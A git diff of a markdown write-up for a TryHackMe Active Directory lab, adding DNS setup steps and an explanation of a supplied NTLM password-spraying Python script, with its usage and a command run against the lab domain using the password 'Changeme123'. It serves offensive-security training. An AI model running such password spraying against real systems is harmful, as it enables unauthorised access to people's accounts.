@@ -109,12 +109,6 @@ xfreerdp /u:Mark@THM /p:"M4rk3t1ng.21" /v:10.10.35.36 /cert:ignore +clipboard
 
 ## Breaching Active Directory
 
-Download the `openvpn` configuration file from the access page and run it:
-
-```shell
-sudo openvpn --config breachingad.ovpn
-```
-
 ### Configure DNS
 
 First, let's start the VPN for this network in the background (mine's name was `breachingad.ovpn`):
@@ -165,6 +159,18 @@ IP4.DNS[2]:                             1.1.1.1
 
 We should be good to go. 
 
+```
+nslookup za.tryhackme.com 10.200.9.101
+```
+
+If it doesn't resolve, try:
+
+```
+sudo ip route add 10.200.9.101 dev breachad
+```
+
+And then try `nslookup` again.
+
 Here's a [script](https://github.com/gremlin-0x/AD_module_dns_config) that does this more reliably and is supposed to work with next rooms as well.
 
 - What popular website can be used to verify if your email address or password has ever been exposed in a publicly disclosed data breach?
@@ -176,7 +182,43 @@ Download and unzip the file tasks:
 unzip passwordsprayer-1111222233334444.zip
 ```
 
-The usage of a password sprayer script provided in these files is the following as per instruction:
+First, let's define what __password spraying__ means. To anyone familiar with password __brute forcing__, password spraying is that, only reversed, meaning we are trying the _same_ password with a _variety_ of usernames.
+
+==_Clarifying the room_==: __(a.)__ this room provides a password spraying python script as well as the username list to use with it. These are usually collected via OSINT or Phishing campaigns and in this particular case `Changeme123` is often a password IT staff uses to set for the employees within a company to gently remind them that it needs changing, which often they forget to do. __(b.)__ The room doesn't quite explain how the script works, which is why we will do it:
+
+```python
+def password_spray(self, password, url):
+    print ("[*] Starting passwords spray attack using the following password: " + password)
+    count = 0
+    for user in self.users:
+        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
+        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
+            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
+            count += 1
+            continue
+        if (self.verbose):
+            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
+                print ("[-] Failed login with Username: " + user)
+    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
+```
+
+The method iterates over all usernames in the `self.users` list and attempts to authenticate using the provided password with NTLM authentication (`HttpNtlmAuth(self.fqdn + "\\" + user, password)`). Successful Login: If the HTTP response is `200`, the credential pair (username and password) is considered valid, and it prints out the result. Failed Login: If the response is `401`, the login failed, and if verbose mode is enabled, it prints a failure message. `count`: Keeps track of how many valid credential pairs were found.
+
+The usage:
+
+```shell
+python3 ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
+```
+
+-u or --userfile: The path to the file containing the list of usernames.
+
+-f or --fqdn: The Fully Qualified Domain Name (FQDN) of the target.
+
+-p or --password: The password to be used in the password spraying attack.
+
+-a or --attackurl: The URL to attack.
+
+Now let's fill this in with our own data.
 
 ```shell
 python3 ntlm_passwordspray.py -u usernames.txt -p "Changeme123" -f "za.tryhackme.com" -a "http://ntlmauth.za.tryhackme.com"
